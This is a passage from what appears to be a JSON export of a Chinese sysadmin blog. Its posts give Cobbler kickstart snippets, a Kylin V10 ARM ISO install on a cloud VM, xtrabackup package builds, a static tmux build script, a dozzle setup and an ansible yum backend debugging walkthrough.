configuration\\n$SNIPPET(\'post_install_kernel_options\')\\n$SNIPPET(\'post_install_network_config\')\\n$SNIPPET(\'download_config_files\')\\n$SNIPPET(\'cobbler_register\')\\n# Enable post-install boot notification\\n$SNIPPET(\'post_anamon\')\\n$SNIPPET(\'post_install_custom_sys\')\\n# Start final steps\\n$SNIPPET(\'kickstart_done\')\\n# End final steps\\n\\n%end\\n```\\n\\n\xa0\u6ce8\u610fks template\u4e2d\u7684\u7ea2\u8272\u90e8\u5206\u4e3a\u6211\u4eec\u589e\u52a0\u7684\u81ea\u5b9a\u4e49snippets\uff0c\u7b2c\u4e00\u4e2apre_partition_select_custom\u4f5c\u7528\u662f\u81ea\u52a8\u6839\u636e\u78c1\u76d8\u7c7b\u578b\u6765\u751f\u6210\u5206\u533a\u548c\u683c\u5f0f\u5316\u9009\u9879\uff0c\u540c\u65f6\u517c\u5bb9\u865a\u62df\u673a\u548c\u7269\u7406\u673a\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\\n\\n```\\n# Determine architecture-specific partitioning needs\\nif [ -b /dev/vda ]; then\\n  cat >/tmp/partinfo << EOF\\nclearpart --initlabel --all\\nignoredisk --only-use=vda\\nbootloader --location=mbr --boot-drive=vda --driveorder=vda\\nclearpart --initlabel --drives=vda\\npart /boot --fstype=ext3 --ondisk=vda --size=500\\npart / --fstype=xfs --size=1024 --grow --ondisk=vda --asprimary\\nEOF\\nelif [ -b /dev/sda ]; then\\n  cat >/tmp/partinfo << EOF\\nclearpart --initlabel --all\\nignoredisk --only-use=sda\\nbootloader --location=mbr --boot-drive=sda --driveorder=sda\\npart /boot --fstype=ext3 --ondisk=sda --size=500\\npart / --fstype=xfs --size=100000 --ondisk=sda --asprimary\\npart /data --fstype=xfs --grow --ondisk=sda\\nEOF\\nfi\\n```\\n\\n\xa0\u7b2c\u4e8c\u4e2apost_install_custom_sys\u4f5c\u7528\u662f\u5728\u7cfb\u7edf\u5b89\u88c5\u6700\u540e\u9636\u6bb5\u5bf9\u4e00\u4e9b\u5fc5\u8981\u7684\u914d\u7f6e\u8fdb\u884c\u66f4\u6539\uff0c\u5176\u4e2d\u8fd0\u884c\u7684\u662fshell\u811a\u672c\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\\n\\n```\\n# cat snippets/post_install_custom_sys\\nif ! grep -q \'custom_sysctl\' /etc/sysctl.conf; then\\n  cat >>/etc/sysctl.conf<<EOF\\n## custom_sysctl\\nfs.file-max = 262144\\nnet.core.somaxconn = 10240\\nvm.swappiness = 0\\nnet.ipv4.ip_local_port_range = 1024 65000\\nnet.core.rmem_max = 16777216\\nnet.core.wmem_max = 16777216\\nnet.core.rmem_default = 1048576\\nnet.core.wmem_default = 524288\\nnet.ipv4.tcp_rmem = 4096 87380 16777216\\nnet.ipv4.tcp_wmem = 4096 65536 16777216\\nnet.core.netdev_max_backlog = 2500\\nnet.ipv4.tcp_max_syn_backlog = 40960\\nnet.ipv4.tcp_syncookies = 1\\nnet.ipv4.tcp_tw_reuse = 1\\nnet.ipv4.tcp_tw_recycle = 1\\nnet.ipv4.tcp_fin_timeout = 30\\nEOF\\nfi\\n\\nchmod +x /etc/rc.d/rc.local\\n\\nif grep -q \'^UseDNS\' /etc/ssh/sshd_config; then\\n  sed -i \'s/^UseDNS .*/UseDNS no/\' /etc/ssh/sshd_config\\nelse\\n  sed -i \'s/^#UseDNS .*/UseDNS no/\' /etc/ssh/sshd_config\\nfi\\n```\\n\\n\\n\u63a5\u4e0b\u6765\u8fd8\u9700\u8981\u4fee\u6539\u5185\u6838\u5f15\u5bfc\u53c2\u6570\uff0c\u5b8c\u6210\u7f51\u5361\u540d\u5b57\u7684\u53d8\u66f4\u53caIPv6\u7981\u7528\uff1a\\n```\\nsed -i -e \'s|^GRUB_CMDLINE_LINUX=\\\\\\"|GRUB_CMDLINE_LINUX=\\\\\\"net.ifnames=0 biosdevname=0 |g\' /etc/default/grub\\nsed -i -e \'s|^GRUB_CMDLINE_LINUX=\\\\\\"|GRUB_CMDLINE_LINUX=\\\\\\"ipv6.disable=1 |g\' /etc/default/grub\\ngrub2-mkconfig -o /boot/grub2/grub.cfg\\n```\\n\\n\\n\u901a\u8fc7\u8fd9\u51e0\u90e8\u5206\u7684\u7ec4\u5408\uff0c\u5373\u53ef\u751f\u6210\u4e00\u4e2a\u5b8c\u6574\u53ef\u7528\u7684ks\u6587\u4ef6\uff0c\u4e0b\u9762\u6211\u5c06\u4ecb\u7ecd\u5982\u4f55\u901a\u8fc7\u865a\u62df\u673a\u6765\u6d4b\u8bd5\u5b89\u88c5\u3002\\n\\n### \u4f7f\u7528\u865a\u62df\u673a\u6d4b\u8bd5PXE\\n\u5b89\u88c5\u865a\u62df\u5316\u76f8\u5173\u8f6f\u4ef6\u5305\uff0c\u4f7f\u7528kvm\u865a\u62df\u673a\uff0c\u540c\u65f6\u5b89\u88c5\u56fe\u5f62\u754c\u9762\u865a\u62df\u673a\u7ba1\u7406\u5de5\u5177virt-manager\u65b9\u4fbf\u5b89\u88c5\u64cd\u4f5c\u3002\u7f51\u7edc\u9009\u62e9\u4f7f\u7528bridge\u6a21\u5f0f,\u70b9\u51fb\u65b0\u5efa\u865a\u62df\u673a\uff0c\u5728\u5b89\u88c5\u9009\u9879\u4e2d\u9009\u62e9PXE,\u6ce8\u610f\u5185\u5b58\u8bbe\u7f6e\u5fc5\u987b\u5927\u4e8e1G\uff0c\u5426\u5219PXE\u5f15\u5bfc\u8fdb\u5165\u7cfb\u7edf\u540e\u5f88\u53ef\u80fd\u62a5\u9519\u3002"},{"id":"/2021/12/16/cvm-kylin-v10-iso-install","metadata":{"permalink":"/notes/blog/2021/12/16/cvm-kylin-v10-iso-install","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-12-16-cvm-kylin-v10-iso-install.md","source":"@site/blog/2021-12-16-cvm-kylin-v10-iso-install.md","title":"CVM\u4f7f\u7528ISO\u955c\u50cf\u5b89\u88c5\u94f6\u6cb3\u9e92\u9e9fv10 arm\u7cfb\u7edf","description":"\u80cc\u666f\uff1a\u4e91\u4e0a\u6ca1\u6709kylin\u7684arm\u955c\u50cf,\u9700\u8981\u81ea\u5df1\u505a\u4e00\u4e2a","date":"2021-12-16T00:00:00.000Z","tags":[{"inline":true,"label":"kylin","permalink":"/notes/blog/tags/kylin"},{"inline":true,"label":"cvm","permalink":"/notes/blog/tags/cvm"}],"readingTime":2.2,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"CVM\u4f7f\u7528ISO\u955c\u50cf\u5b89\u88c5\u94f6\u6cb3\u9e92\u9e9fv10 arm\u7cfb\u7edf","categories":["system","os"],"tags":["kylin","cvm"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528cobbler\u6279\u91cf\u5b89\u88c5centos\u7cfb\u7edf","permalink":"/notes/blog/2022/04/20/pxe-cobbler-install"},"nextItem":{"title":"\u94f6\u6cb3\u9e92\u9e9fv10 aarch64\u673a\u5668\u6784\u5efapercona-xtrabackup-80 rpm\u5305","permalink":"/notes/blog/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm"}},"content":"\u80cc\u666f\uff1a\u4e91\u4e0a\u6ca1\u6709kylin\u7684arm\u955c\u50cf,\u9700\u8981\u81ea\u5df1\u505a\u4e00\u4e2a\\n\\n## 1 \u51c6\u5907\\niso: Kylin-Server-10-SP2-aarch64-Release-Build09-20210524.iso\\n\\n\u4e00\u53f0arm\u7684cvm, \u4e00\u5757\u6570\u636e\u76d8\\n\\nscp  Kylin-Server-10-SP2-aarch64-Release-Build09-20210524.iso  x.x.x.x:/kylin.iso\\n\\n## 2 \u914d\u7f6egrub\\n\\n\u4fee\u6539grub\u914d\u7f6e\u589e\u52a0\u4eceiso\u5f15\u5bfc\u7684\u5165\u53e3\uff0c\u91cd\u542f\u673a\u5668\u65f6\u4eceiso\u5f15\u5bfc\u8fdb\u5165\u5b89\u88c5\u6d41\u7a0b\\n\\n```\\n\\n# cat /etc/grub.d/40_custom\\n#!/bin/sh\\nexec tail -n +3 $0\\n# This file provides an easy way to add custom menu entries.  Simply type the\\n# menu entries you want to add after this comment.  Be careful not to change\\n# the \'exec tail\' line above.\\n\\nmenuentry \'Install Kylin Linux Advanced Server V10\' --class red --class gnu-linux --class gnu --class os {\\n    set isolabel=\\"Kylin-Server-10\\"\\n    set isofile=\\"/kylin.iso\\"\\n    insmod iso9660\\n    loopback loop $isofile\\n    linux (loop)/images/pxeboot/vmlinuz inst.stage2=hd:LABEL=Kylin-Server-10 ro iso-scan/filename=$isofile console=tty0 video=efifb:off video=VGA-1:640x480-32@60me\\n    initrd (loop)/images/pxeboot/initrd.img\\n}\\n\\n```\\n\\n\u4e0a\u9762\u7684\u53c2\u6570\u4ece\u54ea\u83b7\u53d6\u6765\uff1f\\n1 \\n```\\nmount /kylin.iso /mnt\\nfind /mnt -name grub.cfg\\n```\\n\u627e\u5230\u7684\u5185\u5bb9\u4f5c\u4e3alinux\u884c\u7684\u53c2\u8003\\n\\n2\\n```\\nblkid /kylin.iso\\n```\\n\u53ef\u4ee5\u83b7\u5f97isolabel\u4fe1\u606f\\n\\n\u4e0b\u4e00\u6b65\\n```\\nvi /etc/default/grub\\n#\u4fee\u6539GRUB_TIMEOUT=60 \u589e\u52a0timeout\u65b9\u4fbfweb vnc\u767b\u5f55\u64cd\u4f5c\\ngrub2-mkconfig --ouput=/boot/grub2/grub.cfg\\nsync\\nreboot\\n```\\n\\n## 3 \u5f00\u59cb\u88c5\u7cfb\u7edf\\n\\n\u7cfb\u7edf\u4f1a\u5b89\u88c5\u5230\u6570\u636e\u76d8\uff0c\u56e0\u4e3a\u7cfb\u7edf\u76d8\u88abiso\u5360\u7528\uff0cmount\u72b6\u6001\u65e0\u6cd5\u4f7f\u7528\uff0c\u5fc5\u987b\u6709\u72ec\u7acb\u7684\u6570\u636e\u76d8\u7528\u6765\u88c5\u7cfb\u7edf\\n\u6ce8\u610f\u5b89\u88c5cloud-init\u5305\u3002\\n\\n## 4 \u5236\u4f5c\u4e91\u955c\u50cf\\n\\n\u91cd\u542f\u56de\u5230\u539f\u5148\u7684\u7cfb\u7edf\\n```\\nyum -y install qemu-img\\nqemu-img convert -f raw -O qcow2 /dev/vdb /kylin.qcow2\\n```\\n## 5 \u955c\u50cf\u521b\u5efaCVM\u540e\u542f\u52a8\u5931\u8d25\u95ee\u9898\u4e00\u4f8b\\n\\n### \u62a5\u9519\u4fe1\u606f\u5982\u4e0b\uff1a\\n\\n```\\n/dev/disk/by-uuid/bed44859-b637-4490-b7f9-f62f952f6hfa Warning:does not exist\\n\\nGenerating \\"/run/initramfs/rdsosreport.txt\\"\\n\\nEntering emergency mode. Exit the shell to continue.\\"journalctl\\" to view system logs.TypeYou might want to save \\"/run/initramfs/rdsosreport.txt\\" to a USB stick or /bootaftermounting them and attach it to a bug report.\\n```\\n### \u539f\u56e0\u5206\u6790\uff1a\\n\\n##### 1.virtio\u9a71\u52a8\u5b89\u88c5\u7684\u4e0d\u51c6\u786e\u6216\u8005\u5f02\u5e38\\n##### 2.\u5185\u6838\u7f3a\u9677\u672c\u8eab\u5bfc\u81f4\\n\\n### \u89e3\u51b3\u65b9\u6cd5\uff1a\\n##### 1.Virtio\u9a71\u52a8\u7684\u4fee\u590d\\n\\n```\\n\u67e5\u8be2\\ngrep -i virtio /boot/config-$(uname -r)\\n\u662f\u5426\u5305\u542b\u5728\u4e34\u65f6\u6587\u4ef6\u7cfb\u7edf\\nlsinitrd /boot/initramfs-$(uname -r).img | grep virtio\\n\u4fee\u590d\u4e34\u65f6\u6587\u4ef6\u7cfb\u7edf\\nvim /etc/dracut.conf\\nadd_drivers+=\\"virtio_blk virtio_scsi virtio_net virtio_pci virtio_ring virtio\\"\\ndracut -f\\n```\\n##### 2.\u5185\u6838\u7f3a\u9677\u89c4\u907f\\n```\\necho \'add_drivers+=\\"xen-netfront xen-blkfront \\"\' > /etc/dracut.conf.d/xen.conf\\nKERNEL_VERSION=$(rpm -q kernel --qf \'%{V}-%{R}.%{arch}\\\\n\'|head -n1)\\ndracut -f /boot/initramfs-$KERNEL_VERSION.img $KERNEL_VERSION\\n```"},{"id":"/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm","metadata":{"permalink":"/notes/blog/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-07-21-kylin-v10-aarch64-build-percona-xtrabackup-80-rpm.md","source":"@site/blog/2021-07-21-kylin-v10-aarch64-build-percona-xtrabackup-80-rpm.md","title":"\u94f6\u6cb3\u9e92\u9e9fv10 aarch64\u673a\u5668\u6784\u5efapercona-xtrabackup-80 rpm\u5305","description":"\u5982\u4f55\u81ea\u5df1\u6784\u5efaaarch64 xtrabackup rpm","date":"2021-07-21T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.42,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u94f6\u6cb3\u9e92\u9e9fv10 aarch64\u673a\u5668\u6784\u5efapercona-xtrabackup-80 rpm\u5305","description":"\u5982\u4f55\u81ea\u5df1\u6784\u5efaaarch64 xtrabackup rpm","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"CVM\u4f7f\u7528ISO\u955c\u50cf\u5b89\u88c5\u94f6\u6cb3\u9e92\u9e9fv10 arm\u7cfb\u7edf","permalink":"/notes/blog/2021/12/16/cvm-kylin-v10-iso-install"},"nextItem":{"title":"UOS arm64\u673a\u5668build percona-xtrabackup-80 deb\u5305","permalink":"/notes/blog/2021/07/21/uos-arm64-build-percona-xtrabackup-80"}},"content":"## 1 \u73af\u5883\u51c6\u5907\\n```\\n\\nyum install cmake3 openssl-devel libaio libaio-devel automake autoconf bison libtool ncurses-devel \\\\\\n    libgcrypt-devel libev-devel libcurl-devel zlib-devel vim-common readline-devel python-sphinx rpm-build\\n```\\n\\n## 2 \u83b7\u53d6\u6700\u65b0SRPM\u5305\\n\\n```\\n# \u67e5\u770b\u9700\u8981\u4e0b\u8f7d\u7684\u7248\u672c\\nhttps://repo.percona.com/yum/release/8/SRPMS/\\n#\u5982\uff1a\\nwget https://repo.percona.com/yum/release/8/SRPMS/percona-xtrabackup-80-8.0.25-17.1.generic.src.rpm\\n```\\n\\n## 3 BUILD RPM\\n\\n```\\nrpm -ivh percona-xtrabackup-80-8.0.25-17.1.generic.src.rpm\\ncd ~/rpmbuild\\nrpmbuild -bb --nodebuginfo SPECS/percona-xtrabackup.spec\\n```\\n## OVER"},{"id":"/2021/07/21/uos-arm64-build-percona-xtrabackup-80","metadata":{"permalink":"/notes/blog/2021/07/21/uos-arm64-build-percona-xtrabackup-80","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-07-21-uos-arm64-build-percona-xtrabackup-80.md","source":"@site/blog/2021-07-21-uos-arm64-build-percona-xtrabackup-80.md","title":"UOS arm64\u673a\u5668build percona-xtrabackup-80 deb\u5305","description":"uos\u5982\u4f55\u5feb\u901f\u6784\u5efaxtrabackup deb","date":"2021-07-21T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.66,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"UOS arm64\u673a\u5668build percona-xtrabackup-80 deb\u5305","description":"uos\u5982\u4f55\u5feb\u901f\u6784\u5efaxtrabackup deb","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"\u94f6\u6cb3\u9e92\u9e9fv10 aarch64\u673a\u5668\u6784\u5efapercona-xtrabackup-80 rpm\u5305","permalink":"/notes/blog/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm"},"nextItem":{"title":"how to build a static tmux bin","permalink":"/notes/blog/2021/06/30/build-tmux-static"}},"content":"## 1 \u7cfb\u7edf\u73af\u5883\\n\\n```\\nroot@VM-0-14-linux:~# cat /etc/os-release\\nPRETTY_NAME=\\"uos 20\\"\\nNAME=\\"uos\\"\\nVERSION_ID=\\"20\\"\\nVERSION=\\"20\\"\\nID=uos\\nHOME_URL=\\"https://www.chinauos.com/\\"\\nBUG_REPORT_URL=\\"http://bbs.chinauos.com\\"\\n\\nroot@VM-0-14-linux:~# uname -a\\nLinux VM-0-14-linux 4.19.0-arm64-server #1635 SMP Mon Jan 13 16:07:12 CST 2020 aarch64 GNU/Linux\\n\\nroot@VM-0-14-linux:~# cat /etc/debian_version\\n10.1\\nroot@VM-0-14-linux:~#\\n\\n```\\n\\n## 2 \u914d\u7f6eperconca\u5b98\u65b9apt\u6e90\\n\\n```\\nwget https://repo.percona.com/apt/percona-release_latest.buster_all.deb\\ndpkg -i percona-release_latest.buster_all.deb\\n# \u4fee\u6539\u811a\u672c\u4e2d\u4e24\u4e2a\u53d8\u91cf\\nvi /usr/bin/percona-release\\nCODENAME=buster\\nOS_VER=buster\\n# \u5f00\u542fperconca\u6e90\\npercona-release enable-only tools release\\n```\\n\\n## 3 BUILD\\n```\\n# \u5b89\u88c5\u4f9d\u8d56\\napt-get build-dep percona-xtrabackup-80\\n# \u6784\u5efa\\napt-get source --compile percona-xtrabackup-80\\n```\\n\\n## OVER"},{"id":"/2021/06/30/build-tmux-static","metadata":{"permalink":"/notes/blog/2021/06/30/build-tmux-static","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-06-30-build-tmux-static.md","source":"@site/blog/2021-06-30-build-tmux-static.md","title":"how to build a static tmux bin","description":"build-tmux-static.sh","date":"2021-06-30T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.74,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"how to build a static tmux bin","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"UOS arm64\u673a\u5668build percona-xtrabackup-80 deb\u5305","permalink":"/notes/blog/2021/07/21/uos-arm64-build-percona-xtrabackup-80"},"nextItem":{"title":"\u4f7f\u7528dozzle\u901a\u8fc7web\u754c\u9762\u5b9e\u65f6\u67e5\u770bdocker\u65e5\u5fd7","permalink":"/notes/blog/2021/06/08/dozzle-realtime-docker-log-view"}},"content":"build-tmux-static.sh\\n```\\n#!/bin/bash\\nTARGETDIR=$1\\nif [ \\"$TARGETDIR\\" = \\"\\" ]; then\\nTARGETDIR=$(python -c \'import os; print os.path.realpath(\\"local\\")\')\\nfi\\nmkdir -p $TARGETDIR\\n\\nlibevent() {\\n  curl -LO https://github.com/libevent/libevent/releases/download/release-2.0.22-stable/libevent-2.0.22-stable.tar.gz\\n  tar -zxvf libevent-2.0.22-stable.tar.gz\\n  cd libevent-2.0.22-stable\\n  ./configure --prefix=$TARGETDIR && make && make install\\n  cd ..\\n}\\n\\nncurses() {\\n  curl -LO https://ftp.gnu.org/pub/gnu/ncurses/ncurses-6.0.tar.gz\\n  tar zxvf ncurses-6.0.tar.gz\\n  cd ncurses-6.0\\n\\n  ./configure --with-termlib --prefix $TARGETDIR \\\\\\n              --with-default-terminfo-dir=/usr/share/terminfo \\\\\\n              --with-terminfo-dirs=\\"/etc/terminfo:/lib/terminfo:/usr/share/terminfo\\" \\\\\\n              --enable-pc-files \\\\\\n              --with-pkg-config-libdir=$TARGETDIR/lib/pkgconfig \\\\\\n  && make && make install\\n  cd ..\\n}\\n\\ntmux() {\\n  curl -LO https://github.com/tmux/tmux/releases/download/3.2a/tmux-3.2a.tar.gz\\n  tar zxvf tmux-3.2a.tar.gz\\n  cd tmux-3.2a\\n  PKG_CONFIG_PATH=$TARGETDIR/lib/pkgconfig ./configure --enable-static --prefix=$TARGETDIR && make && make install\\n  cd ..\\n  cp $TARGETDIR/bin/tmux .\\n}\\n\\nlibevent\\nncurses\\ntmux\\n```"},{"id":"/2021/06/08/dozzle-realtime-docker-log-view","metadata":{"permalink":"/notes/blog/2021/06/08/dozzle-realtime-docker-log-view","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-06-08-dozzle-realtime-docker-log-view.md","source":"@site/blog/2021-06-08-dozzle-realtime-docker-log-view.md","title":"\u4f7f\u7528dozzle\u901a\u8fc7web\u754c\u9762\u5b9e\u65f6\u67e5\u770bdocker\u65e5\u5fd7","description":"\u5982\u4f55\u901a\u8fc7web\u754c\u9762\u67e5\u770bdocker\u5bb9\u5668\u65e5\u5fd7","date":"2021-06-08T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":0.36,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528dozzle\u901a\u8fc7web\u754c\u9762\u5b9e\u65f6\u67e5\u770bdocker\u65e5\u5fd7","description":"\u5982\u4f55\u901a\u8fc7web\u754c\u9762\u67e5\u770bdocker\u5bb9\u5668\u65e5\u5fd7","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"how to build a static tmux bin","permalink":"/notes/blog/2021/06/30/build-tmux-static"},"nextItem":{"title":"\u4e2d\u6807\u9e92\u9e9f\u7cfb\u7edfansible\u6267\u884cyum\u6a21\u5757\u62a5\u9519\u7684\u95ee\u9898\u5206\u6790","permalink":"/notes/blog/2021/03/22/neokylin-ansible-yum-module-not-work"}},"content":"## 1 \u8fd0\u884cdozzle\\n```\\ndocker run --detach --volume=/var/run/docker.sock:/var/run/docker.sock --net host  amir20/dozzle --addr 127.0.0.1:8080  --base /dockerlogs\\n```\\n## 2 \u53cd\u5411\u4ee3\u7406\\n```\\nserver {\\n    listen 80;\\n    server_name xxx;\\n    client_max_body_size 1G;\\n    add_header  Access-Control-Allow-Origin \\"https://xxx\\";\\n    add_header  Access-Control-Allow-Methods \\"GET, POST, OPTIONS\\";\\n    add_header  Access-Control-Allow-Headers \\"Origin, Authorization, Accept\\";\\n    add_header  Access-Control-Allow-Credentials true;\\n\\n    location ^~ /dockerlogs {\\n        proxy_pass http://localhost:8080;\\n    }\\n}\\n```\\n\\n## 3 \u8bbf\u95ee\\n\\nhttp://x.x.x.x/dockerlogs"},{"id":"/2021/03/22/neokylin-ansible-yum-module-not-work","metadata":{"permalink":"/notes/blog/2021/03/22/neokylin-ansible-yum-module-not-work","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-03-22-neokylin-ansible-yum-module-not-work.md","source":"@site/blog/2021-03-22-neokylin-ansible-yum-module-not-work.md","title":"\u4e2d\u6807\u9e92\u9e9f\u7cfb\u7edfansible\u6267\u884cyum\u6a21\u5757\u62a5\u9519\u7684\u95ee\u9898\u5206\u6790","description":"","date":"2021-03-22T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":6.65,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4e2d\u6807\u9e92\u9e9f\u7cfb\u7edfansible\u6267\u884cyum\u6a21\u5757\u62a5\u9519\u7684\u95ee\u9898\u5206\u6790","description":"","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528dozzle\u901a\u8fc7web\u754c\u9762\u5b9e\u65f6\u67e5\u770bdocker\u65e5\u5fd7","permalink":"/notes/blog/2021/06/08/dozzle-realtime-docker-log-view"},"nextItem":{"title":"bashrc\u4e0eprofile\u7684\u52a0\u8f7d\u987a\u5e8f","permalink":"/notes/blog/2021/02/24/bash-rc-profile-exec-order"}},"content":"> \u5728\u4f7f\u7528\u4e2d\u6807\u9e92\u9e9fV7Update6\u7248\u672c\u65f6\uff0c\u9047\u5230\u4e86\u4e00\u4e2aansible\u6267\u884c\u62a5\u9519\u7684\u95ee\u9898\\n\\n\\n## \u95ee\u9898\u73b0\u8c61\\n\\n\u5728\u4e2d\u6807\u9e92\u9e9f\uff08neokylin\uff09\u7cfb\u7edf\u4e2d\u90e8\u7f72\u67d0\u670d\u52a1\uff0c\u4f7f\u7528\u5230\u4e86ansible\uff0c\u4f46\u662f\u6267\u884c\u65f6\u53d1\u73b0\u6709yum\u6a21\u5757\u7684task\u62a5\u9519\u5982\u4e0b\uff1a\\n```\\nTASK [common : Install basic rpms] **************************************************************************\\nfatal: [node01]: FAILED! => {\\"changed\\": false, \\"msg\\": [\\"Could not detect which major revision of yum is in use, which is required to determine module backend.\\", \\"You can manually specify use_backend to tell the module whether to use the yum (yum3) or dnf (yum4) backend})\\"]}\\n```\\n\\n\u62a5\u9519\u4e3ayum\u6a21\u5757\u65e0\u6cd5\u5224\u65ad\u51fa\u7cfb\u7edf\u7684yum\u7248\u672c\uff0c\u63d0\u793a\u9700\u8981\u624b\u5de5\u6267\u884cyum\u7684use_backend\u53c2\u6570\u3002\u540c\u6837\u7684task\u5728\u539f\u751fRHEL7\u7cfb\u7edf\u6267\u884c\u6ca1\u6709\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u770b\u6837\u5b50\u8c03\u5165\u4e86\u4e2d\u6807\u9e92\u9e9f\u7684\u67d0\u4e2a\u5751\u91cc\u3002\\n\\n## \u95ee\u9898\u5206\u6790\\n\\n\u6839\u636e\u62a5\u9519\uff0c\u5f88\u660e\u786e\u662f\u56e0\u4e3aansible\u65e0\u6cd5\u81ea\u52a8\u5224\u65ad\u51fa\u7cfb\u7edf\u4f7f\u7528\u7684yum\u7248\u672c\u5bfc\u81f4\uff0c\u6211\u4eec\u77e5\u9053\u5f53ansible\u4e2dyum\u6a21\u5757\u4e0d\u6307\u5b9ause_backend\u53c2\u6570\u65f6\uff0c\u5c06\u5c1d\u8bd5\u81ea\u52a8\u5224\u65ad\uff0c\u800cansible\u7684setup\u6a21\u5757\u53ef\u4ee5\u83b7\u53d6\u5bf9\u5e94\u7684\u5fc5\u8981\u4fe1\u606f\uff0c\\n\u5176\u4e2d\u4e00\u4e2a\u53d8\u91cfansible_pkg_mgr\u53ca\u5bf9\u5e94yum\u540e\u7aef\u6a21\u5757\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u6267\u884csetup\u6a21\u5757\u8f93\u51faansible_pkg_mgr\u53d8\u91cf\u6765\u9a8c\u8bc1\u4e0b\u6211\u4eec\u7684\u5224\u65ad\uff1a\\n\\n```\\n# ansible -i hosts node01 -m setup -a \\"filter=ansible_pkg_mgr\\"\\nnode01 | SUCCESS => {\\n    \\"ansible_facts\\": {\\n        \\"discovered_interpreter_python\\": \\"/usr/bin/python\\"\\n    },\\n    \\"changed\\": false\\n}\\n```\\n\\n\u679c\u7136\u6ca1\u6709\u529e\u6cd5\u83b7\u53d6\u5230ansible_pkg_mgr\u53d8\u91cf\uff0c\u5148\u770b\u4e0b\u7cfb\u7edf\u7248\u672c\u4fe1\u606f:\\n```\\n~]# cat /etc/neokylin-release\\nNeoKylin Linux Advanced Server release V7Update6 (Chromium)\\n```\\n\\n\u63a5\u4e0b\u6765\u6839\u636e\u62a5\u9519\u63d0\u793a\u4fe1\u606f\u627e\u5230ansible\u76f8\u5173\u4ee3\u7801\uff0c\u5728yum.py\u4e2d\uff0c\u76f8\u5173\u4ee3\u7801\u5982\u4e0b\uff1a\\nansible/plugins/action/yum.py\\n```\\n        if module not in [\\"yum\\", \\"yum4\\", \\"dnf\\"]:\\n            facts = self._execute_module(module_name=\\"setup\\", module_args=dict(filter=\\"ansible_pkg_mgr\\", gather_subset=\\"!all\\"), task_vars=task_vars)\\n            display.debug(\\"Facts %s\\" % facts)\\n            module = facts.get(\\"ansible_facts\\", {}).get(\\"ansible_pkg_mgr\\", \\"auto\\")\\n            if (not self._task.delegate_to or self._task.delegate_facts) and module != \'auto\':\\n                result[\'ansible_facts\'] = {\'pkg_mgr\': module}\\n\\n        if module != \\"auto\\":\\n\\n            if module == \\"yum4\\":\\n                module = \\"dnf\\"\\n\\n            if module not in self._shared_loader_obj.module_loader:\\n                result.update({\'failed\': True, \'msg\': \\"Could not find a yum module backend for %s.\\" % module})\\n            else:\\n                # run either the yum (yum3) or dnf (yum4) backend module\\n                new_module_args = self._task.args.copy()\\n                if \'use_backend\' in new_module_args:\\n                    del new_module_args[\'use_backend\']\\n\\n                display.vvvv(\\"Running %s as the backend for the yum action plugin\\" % module)\\n                result.update(self._execute_module(module_name=module, module_args=new_module_args, task_vars=task_vars, wrap_async=self._task.async_val))\\n                # Now fall through to cleanup\\n        else:\\n            result.update(\\n                {\\n                    \'failed\': True,\\n                    \'msg\': (\\"Could not detect which major revision of yum is in use, which is required to determine module backend.\\",\\n                            \\"You can manually specify use_backend to tell the module whether to use the yum (yum3) or dnf (yum4) backend})\\"),\\n                }\\n            )\\n            # Now fall through to cleanup\\n\\n```\\n\u5982\u4ee3\u7801\u6240\u793a\uff0c\u5f53\u6267\u884cyum\u672a\u6307\u5b9ause_backend\u53c2\u6570\u65f6\uff0cansible\u4f1a\u6267\u884csetup\u6a21\u5757\u5e76\u6839\u636eansible_pkg_mgr\u6765\u81ea\u52a8\u5224\u65adyum\u7684\u7248\u672c\uff0c\u83b7\u53d6\u4e0d\u5230\u5219\u4f1a\u62a5\u9519\uff0c\u7ee7\u7eed\u770b\u4e0b\u8be5\u53c2\u6570\u7684\u83b7\u53d6\u8fc7\u7a0b\uff0c\u627e\u5230pkg_mgr.py\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b\uff1a\\n\\nansible/module_utils/facts/system/pkg_mgr.py\\n```\\n    def collect(self, module=None, collected_facts=None):\\n        facts_dict = {}\\n        collected_facts = collected_facts or {}\\n\\n        pkg_mgr_name = \'unknown\'\\n        for pkg in PKG_MGRS:\\n            if os.path.exists(pkg[\'path\']):\\n                pkg_mgr_name = pkg[\'name\']\\n\\n        # Handle distro family defaults when more than one package manager is\\n        # installed or available to the 